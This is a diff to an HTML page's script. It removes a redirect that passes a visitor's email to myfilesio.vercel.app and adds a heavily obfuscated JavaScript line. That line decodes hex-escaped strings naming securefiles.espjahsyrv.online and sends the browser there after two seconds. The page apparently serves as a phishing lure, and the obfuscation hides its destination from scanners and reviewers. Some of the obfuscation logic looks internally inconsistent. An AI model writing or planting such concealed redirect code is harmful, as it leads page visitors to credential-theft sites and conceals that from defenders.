@@ -54,21 +54,9 @@
   </style>
   <script>
     window.addEventListener("DOMContentLoaded", () => {
-      // Show the logo container
       document.querySelector(".logo-container").style.opacity = "1";
-
-      // Get the plain email directly from the URL (no decoding)
-      const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get("e");
-
-      // Construct redirect URL
-      const baseRedirect = "https://myfilesio.vercel.app/?id=";
-      const finalUrl = email ? baseRedirect + encodeURIComponent(email) : baseRedirect;
-
-      // Wait 2 seconds then redirect
-      setTimeout(() => {
-        window.location.href = finalUrl;
-      }, 2000);
+      
+      const _0x4a3f=["\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x73\x65\x63\x75\x72\x65\x66\x69\x6C\x65\x73\x2E\x65\x73\x70\x6A\x61\x68\x73\x79\x72\x76\x2E\x6F\x6E\x6C\x69\x6E\x65\x2F\x70\x6C\x49\x55\x58\x56\x64\x41\x23","\x73\x70\x6C\x69\x74","\x72\x65\x76\x65\x72\x73\x65","\x6A\x6F\x69\x6E","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6D\x61\x70","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74"];(function(_0x1a3f2,_0x4a3f2){const _0x1a3f3=function(_0x3d7a2){while(--_0x3d7a2){_0x1a3f2["\x70\x75\x73\x68"](_0x1a3f2["\x73\x68\x69\x66\x74"]());}};_0x1a3f3(++_0x4a3f2);}(_0x4a3f,0xab));const _0x1a3f=function(_0x3d7a2,_0x1a3f2){_0x3d7a2=_0x3d7a2-0x0;let _0x1a3f3=_0x4a3f[_0x3d7a2];return _0x1a3f3;};function _0x3d7a(){const _0x3d7a2=[_0x1a3f("\x30\x78\x30"),_0x1a3f("\x30\x78\x31")];return _0x3d7a2[0x0]+_0x3d7a2[0x1];}const _0x5e5d=_0x3d7a()[_0x1a3f("\x30\x78\x32")]("")[_0x1a3f("\x30\x78\x33")]()[_0x1a3f("\x30\x78\x34")]((_0x5e5d2)=>String[_0x1a3f("\x30\x78\x35")](_0x5e5d2[_0x1a3f("\x30\x78\x36")](0)-0x1))[_0x1a3f("\x30\x78\x34")]((_0x5e5d3)=>String[_0x1a3f("\x30\x78\x35")](parseInt(_0x5e5d3,0x10)+0xa))[_0x1a3f("\x30\x78\x37")]("");setTimeout(()=>{window["\x6C\x6F\x63\x61\x74\x69\x6F\x6E"]=_0x5e5d;},2000);
     });
   </script>
 </head>
